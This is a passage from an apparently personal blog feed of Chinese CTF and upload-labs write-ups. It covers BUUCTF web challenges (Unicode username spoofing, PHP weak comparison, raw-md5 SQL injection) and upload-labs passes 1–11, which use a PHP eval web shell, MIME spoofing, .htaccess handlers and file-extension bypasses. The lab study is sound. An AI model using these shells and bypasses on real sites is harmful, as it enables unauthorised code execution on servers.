class=\"keyword\">return</span> username</span><br></pre></td></tr></table></figure>\n<p>在三个功能点处都调用过一次该函数：register、login、change</p>\n<p>在登录时，会调用 strlower ()，将ᴬᴰᴹᴵᴺ 转成 ADMIN，存储在 session 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        session[<span class=\"string\">&#x27;name&#x27;</span>] = name</span><br></pre></td></tr></table></figure>\n<p>因此，我们注册一个账户名为ᴬᴰᴹᴵᴺ的用户，登录后欢迎界面会显示 ADMIN</p>\n<img src=\"buuctf-web9.png\" style=\"zoom:50%;\" />\n<p>修改密码时，同样会再次调用 strlower ()，将 ADMIN 转成 admin，存储在 session 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:        name = strlower(session[<span class=\"string\">&#x27;name&#x27;</span>])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(<span class=\"string\">&#x27;change successful&#x27;</span>)        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>\n<p>因此此时我们修改的密码为 admin 的密码</p>\n<p>然后嚯嚯嚯拿到 flag ヾ (･ω･`｡)</p>\n<p>🎀大失败</p>\n<p>因为登录时，是先写入 session，再判断该账户是否登录成功</p>\n<p>改密码时，需要获取 session，再进行密码修改</p>\n<p>因此在登录写入 session 之后，判断用户是否登录成功销毁 session 之前，此时修改密码，就可以成功修改登录用户的密码</p>\n<p>但是我没有看见 login 处登录失败时，会销毁 session</p>\n<p>🐴所以先在火狐上登录一个随便注册的账号，打开更改密码界面</p>\n<p>🐴再在谷歌上登录 admin 账号（随便输入密码）</p>\n<p>🐴最后修改密码</p>\n<p>用修改的密码登录 admin 账号失败</p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://blog.csdn.net/weixin_44677409/article/details/100733581\">此题三种解法</a></p>\n<p><a href=\"https://www.jianshu.com/p/278d4f59839d\">flask session</a></p>\n<p><a href=\"https://chenlvtang.github.io/2020/05/14/Unicode%E5%B0%8F%E9%AA%97%E5%AD%90/#%E4%B8%BE%E4%B8%AA%F0%9F%8C%B0-HCTF2018-admin\">Unicode 小骗子</a></p>\n<p>php 弱类型比较表</p>\n<p><img src=\"buuctf-web10.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"极客大挑战-2019-buyflag\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019-buyflag\">#</a> 极客大挑战 2019 BuyFlag</h2>\n<p><em>关键词：php、strcmp () 绕过</em></p>\n<p>🎀查看 pay.php 源码，发现提示</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~~~post money <span class=\"keyword\">and</span> password~~~<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_numeric(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;\t\t\t&#125;<span class=\"keyword\">elseif</span> (<span class=\"variable\">$password</span> == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;\t</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>password 弱比较，password=404a</p>\n<p>🎀根据 Flag need your 100000000 money，可以使用科学计数法 1e9，也可以通过<a href=\"https://blog.csdn.net/cherrie007/article/details/77473817\"> strcmp 漏洞</a>，进行绕过</p>\n<p>money []=a 或者 money=1e9 都可以</p>\n<p>🎀根据 You must be a student from CUIT，大概率是在 cookie 处验证身份信息</p>\n<p>发现 cookie 处有一个 user=0，改成 user=1 即可通过验证</p>\n<hr>\n<h2 id=\"bjdctf2020-easy-md5\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf2020-easy-md5\">#</a> BJDCTF2020 Easy MD5</h2>\n<p><em>关键词：php、md5 () 绕过</em></p>\n<p>抓包看见响应包中的提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>看题如果正常 md5 加密 pass 这个逻辑，肯定注不进去哇</p>\n<p>辣就去找关于 md5 () 这个函数的漏洞</p>\n<blockquote>\n<p>语法：md5 (string,raw)</p>\n<p><strong>string</strong>: 所需加密的字符串</p>\n<p><strong>raw</strong>: 可选参数 TRUE 或 FALSE。FALSE（默认，32 字符十六进制数）；TRUE（原始 16 字符二进制格式）</p>\n</blockquote>\n<p>也就是说当第二个参数为 true 时，返回的是原始 16 字符二进制格式的散列值，会被当做 ascii 码字符串处理（？）</p>\n<p>⭐原始二进制数据指原始字符串转换成 ascii 码后组成的字符串</p>\n<p>所以只需要找到一个 str，经过 md5 (str, true) 加密后，再转成 ascii 码字符串，包含我们需要注入的字符即可</p>\n<p>看 sql 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>将 where 后的条件恒为真时，我们就可获取 admin 表中的所有数据</p>\n<p>🐴能用的字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8string: T0Do#&#x27;or&#x27;8content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cstring: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>当且仅当 or 后字符串开头字符为 0 时，返回 false</p>\n<p>输入 payload，跳转至 levels91.php，源码中包含提示：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];<span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];<span class=\"keyword\">if</span>(<span class=\"variable\">$a</span> != <span class=\"variable\">$b</span> &amp;&amp; md5(<span class=\"variable\">$a</span>) == md5(<span class=\"variable\">$b</span>))&#123;    <span class=\"comment\">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>\n<p>当字符串 a，b 不相等，md5 加密后的字符串相等后，进入 if 中没有放出来的代码</p>\n<p>⭐5️⃣⑧訾 Dao の 4：md5 () 或者 sha1 () 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>和</mtext></mrow><annotation encoding=\"application/x-tex\">a和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">和</span></span></span></span> b 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a[]=111&amp;b[]=www</span><br></pre></td></tr></table></figure>\n<p>跳转至 levell14.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>error_reporting(<span class=\"number\">0</span>);<span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;highlight_file(<span class=\"keyword\">__FILE__</span>);<span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>]!==<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>])===md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]))&#123;    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;&#125; </span><br></pre></td></tr></table></figure>\n<p>payload (POST 请求):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>\n<p>一样の zsd</p>\n<p><strong>参考链接</strong></p>\n<p><a href=\"https://blog.csdn.net/iczfy585/article/details/106081299\">PHP 中 md5 常见绕过</a></p>\n<p><a href=\"https://www.w3school.com.cn/php/func_string_md5.asp\">PHP_md5 函数</a></p>\n<p><a href=\"https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/\">探究 php 的 MD5 函数输出的原始二进制数据是啥？</a></p>\n<p><a href=\"https://www.cnblogs.com/wangtanzhi/p/12304899.html\">哒暗</a></p>\n<hr>\n<p>未完待续…</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "upload-labs基础关卡",
            "date_published": "2020-11-25T13:24:52.000Z",
            "content_html": "<h1 id=\"pass-01\"><a class=\"markdownIt-Anchor\" href=\"#pass-01\">#</a> Pass-01</h1>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>第一关，通常随便传把哈哈哈</p>\n<p>来个 php 一句话</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hqxx&#x27;</span>]);    </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>哦豁，弹窗提示了：该文件不允许上传，请上传.jpg|.png|.gif 类型的文件，当前文件类型为：.php</p>\n<p>弹窗提示，没有发请求包，说明是前端验证了，那就去找 js 验证代码，干掉他</p>\n<p><img src=\"upload-labs-01-01.png\" alt=\"\"></p>\n<p>方法 1：Ctrl+F 找哪个标签用了这个函数，删掉它，然后点击上传</p>\n<p><img src=\"upload-labs-01-02.png\" alt=\"\"></p>\n<p>方法 2：复制 checkFile 函数，将.php 类型加进白名单，在控制台输入运行后点击上传</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkFile() &#123;</span><br><span class=\"line\">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //定义允许上传的文件类型</span><br><span class=\"line\">    var allow_ext = &quot;.jpg|.png|.gif|.php&quot;;</span><br><span class=\"line\">    //提取上传文件的类型</span><br><span class=\"line\">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">    //判断上传文件类型是否允许上传</span><br><span class=\"line\">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上传后通过查看器得到文件路径</p>\n<p><img src=\"upload-labs-01-03.png\" alt=\"\"></p>\n<p>上菜刀</p>\n<p>菜刀没上去，上蚁剑</p>\n<p><img src=\"upload-labs-01-04.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-01-05.png\" alt=\"\"></p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>在控台运行函数的方法，我还是一个月之前才知道的（别说 de），明明很容易想到或者尝试到的点…</p>\n<p>感觉还是要脑洞大一点，多尝试一些</p>\n<h1 id=\"pass-02\"><a class=\"markdownIt-Anchor\" href=\"#pass-02\">#</a> Pass-02</h1>\n<p>date：2020-11-25 22:01:47</p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<p>通过查看器，找到前端的 onsubmit 事件，但是删除后，还是判定文件类型不正确</p>\n<p><img src=\"upload-labs-02-01.png\" alt=\"\"></p>\n<p>并没有在前端看见 js 代码，应该是后台判断了</p>\n<p>看一下提示：本 pass 在服务端对数据包的 MIME 进行检查！</p>\n<p>上传文件，bp 抓包，更改 MIME 类型为 image/png，同时得到路径</p>\n<p><img src=\"upload-labs-02-02.png\" alt=\"\"></p>\n<p>上蚁剑连接即可。</p>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>真百度了好多次了，每次都忘记</p>\n<p>“MIME 的全称是 Multipurpose Internet Mail Extensions, 即多用途互联网邮件扩展类型。 这是 HTTP 协议中用来定义文档性质及格式的标准。</p>\n<table>\n<thead>\n<tr>\n<th>文件类型</th>\n<th>后缀</th>\n<th>数据包中的文件类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>超文本标记语言文本</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml 文档</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>普通文本文档</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF 文本</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF 文档</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word 文件</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG 图像</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF 图形</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG 图形</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>任意的二进制数据</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"pass-03\"><a class=\"markdownIt-Anchor\" href=\"#pass-03\">#</a> Pass-03</h1>\n<p>date：2020-11-25 22:53:30</p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<p>不废话直接传 php 上爆破抓包，send to repeater</p>\n<p><img src=\"upload-labs-02-03.png\" alt=\"\"></p>\n<p>根据上传 php 文件后的提示，非常有理由认为后台设置了后缀的黑名单</p>\n<p>大小写绕过，没绕过去，空格绕过去了但是不解析，那既然是黑名单，就把后缀改成 php4 呗</p>\n<p><img src=\"upload-labs-03-01.png\" alt=\"\"></p>\n<p>上蚁剑连接的时候，脚本改成 php4 类型的就可以了</p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>据说，空格可以那啥，windows 会忽略空格和点，可是我上传成功不能解析</p>\n<p>然后 00 截断上传，右键看源代码是我的一句话，后来查了一下截断上传的条件：</p>\n<ol>\n<li>php 版本小于 5.3.29</li>\n<li>magic_quotes_gpc = Off</li>\n</ol>\n<p>唉</p>\n<h1 id=\"pass-04\"><a class=\"markdownIt-Anchor\" href=\"#pass-04\">#</a> Pass-04</h1>\n<p>date：2020-11-25 23:03:25</p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<p>提示：</p>\n<p>本 pass 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件！</p>\n<p>看了下源码空格大小写啥的，都被弄了</p>\n<p>但是没有过滤.htaccess 后缀</p>\n<p>要启用.htaccess，要更改 httpd.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AllowOverride None </span><br><span class=\"line\">更改为：AllowOverride All</span><br></pre></td></tr></table></figure>\n<p><img src=\"upload-labs-04-01.png\" alt=\"\"></p>\n<p>去掉框住这行的注释符号</p>\n<p><img src=\"upload-labs-04-02.png\" alt=\"\"></p>\n<p>上传.htaccess，所有文件都会解析为 php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n<p>然后上传 hqxx.png 图片马</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>题目也给了路径了，地址栏直接输入就行</p>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>我最后也没把.png 解析 php 成功</p>\n<p>在.htaccess 里面随便输错误字符，报 500，去看 apache 的日志说我输入的错误字符不对，说明我上传的.htaccess 文件是被解析了的</p>\n<p>把 httpd.conf 里面所有的 AllowOverride None 都改成了 AllowOverride All，重写模块也开了，文件路径也没有问题，php 版本也调低了，phpstudy 也重启了，但永远就是这样：</p>\n<p><img src=\"upload-labs-04-03.png\" alt=\"\"></p>\n<p>我觉得应该还是配置文件的问题，可是到底是哪里出了问题啊！！！</p>\n<p>而后修改 htaccess 为，把文件名包含 hqxx 的文件全部以 php 解析:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;hqxx&quot; &gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>发现 a.php 可以解析成功，而 hqxx.php 不能解析，我真真真呵呵了</p>\n<p>找了好久终于发现有一个人和我一样的问题了，哭唧唧</p>\n<p><a href=\"https://www.zhaosimeng.cn/zqzb/55.html\">谢谢大哥</a></p>\n<p>在新版中 php 环境默认都是带 nts 的，而在旧版本中则可以选择不带，选一个不带 nts 的 php 版本就可以正常玩了，但是我的 phpstudy 里的 php 全是带 nts 的，谢谢您了</p>\n<ol>\n<li>\n<p><strong>.htaccess 上传漏洞</strong></p>\n<p>漏洞形成条件</p>\n<ul>\n<li>apache 服务器</li>\n<li>能够上传.htaccess 文件，一般为黑名单限制。</li>\n<li>AllowOverride All，默认配置为关闭 None。</li>\n<li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li>\n<li>上传目录具有可执行权限。</li>\n</ul>\n</li>\n<li>\n<p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。</p>\n<p>概述来说，htaccess 文件是<a href=\"https://baike.baidu.com/item/Apache\"> Apache</a> 服务器中的一个配置文件，它负责相关目录下的网页配置。</p>\n<p>启用.htaccess，需要修改 httpd.conf，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。</p>\n<p>.htaccess 的主要作用就是实现 url 改写，也就是当浏览器通过 url 访问到服务器某个文件夹时，作为主人，我们可以来接待这个 url，具体地怎样接待它，就是此文件的作用。</p>\n<p><a href=\"https://www.cnblogs.com/gyrgyr/p/10773118.html\">.htaccess 使用方法介绍</a></p>\n</li>\n</ol>\n<h1 id=\"pass-05\"><a class=\"markdownIt-Anchor\" href=\"#pass-05\">#</a> Pass-05</h1>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<p>看源码，已经不让上传.htaccess 了，但是这次没有把后缀名全转成小写了，也就是说嘿嘿嘿</p>\n<p>上传 hqxx.phP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>\n<p>上传成功，地址栏直接输入路径</p>\n<p><img src=\"upload-labs-05-01.png\" alt=\"\"></p>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<p>我把 apache 玩崩了，重装都不行，换了 Nginx 哈哈哈</p>\n<p>顺便查了下 nginx 用 htaccess 的方法，<a href=\"https://blog.csdn.net/cs729298/article/details/77478155\">想看点我</a></p>\n<h1 id=\"pass-06\"><a class=\"markdownIt-Anchor\" href=\"#pass-06\">#</a> Pass-06</h1>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<p>看源码，依然是黑名单</p>\n<p>并且将后缀名全部转换为小写了，但是空格啥的没去除了</p>\n<p>在文件名末尾加一个空格上传</p>\n<p><img src=\"upload-labs-06-01.png\" alt=\"\"></p>\n<p>解析成功</p>\n<p><img src=\"upload-labs-06-02.png\" alt=\"\"></p>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>利用 Windows 特性 在 Windows 中文件后缀名末尾有空格会自动去掉</p>\n<h1 id=\"pass-07\"><a class=\"markdownIt-Anchor\" href=\"#pass-07\">#</a> Pass-07</h1>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<p>看源码，转换了大小写，去除了首位空格</p>\n<p>那就在文件末尾加。呗</p>\n<p>上传成功，解析成功</p>\n<p><img src=\"upload-labs-07-01.png\" alt=\"\"></p>\n<h2 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结</h2>\n<p>下一题</p>\n<h1 id=\"pass-08\"><a class=\"markdownIt-Anchor\" href=\"#pass-08\">#</a> Pass-08</h1>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<p>上传 hqxx.php::DATA</p>\n<p><img src=\"upload-labs-08-01.png\" alt=\"\"></p>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>利用 windows 特性：</p>\n<p>必须是 windows, 必须是 php, 必须是那个源文件<br>\n php 在 window 的时候如果文件名后加上 &quot;::$DATA&quot;</p>\n<p>会把 &quot;::$DATA&quot; 之后的数据当成文件流处理，不会检测后缀名</p>\n<p>且保持 &quot;::$DATA&quot; 之前的文件名</p>\n<p>他的目的就是不检查后缀名</p>\n<p>改源代码测试了一下，其实和。空格是一样的，就是利用 windows 特性绕过黑名单，上传到文件夹时，文件后面的 &quot;::DATA…&quot; 已经被去掉了</p>\n<h1 id=\"pass-09\"><a class=\"markdownIt-Anchor\" href=\"#pass-09\">#</a> Pass-09</h1>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<p>看提示：本 pass 只允许上传.jpg|.png|.gif 后缀的文件！</p>\n<p>看了源码发现，你这个骗子，明明还是黑名单，下次不看提示了</p>\n<p>看源码：先删除了末尾的点，然后去掉了::$DATA，后缀转成了小写，最后去除首尾空格</p>\n<p>那就 hqxx.php. .</p>\n<p>这样最后在末尾就留下了一个点，上传成功</p>\n<p><img src=\"upload-labs-09-01.png\" alt=\"\"></p>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>跟着代码逻辑走～，可是黑盒都看不到源代码唉</p>\n<h1 id=\"pass-10\"><a class=\"markdownIt-Anchor\" href=\"#pass-10\">#</a> Pass-10</h1>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<p>哈哈哈，源代码注释没了</p>\n<p>先去除文件名中的所有空格，再把文件名中所有在黑名单中存在的字符置空</p>\n<p>那么就，双写，成功绕过</p>\n<p><img src=\"upload-labs-10-01.png\" alt=\"\"></p>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>下一题</p>\n<h1 id=\"pass-11\"><a class=\"markdownIt-Anchor\" href=\"#pass-11\">#</a> Pass-11</h1>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h2>\n<p>观摩源代码，发现是白名单，允许的类型有’jpg’,‘png’,‘gif’，而且还给文件重命名了</p>\n<p>上传 php 抓包发现 save_path=…/upload</p>\n<p>源码中文件保存路径就是 $img_path = <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><msup><mi>h</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mn>10</mn><mo separator=\"true\">,</mo><mn>99</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>Y</mi><mi>m</mi><mi>d</mi><mi>H</mi><mi>i</mi><mi>s</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.038em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span 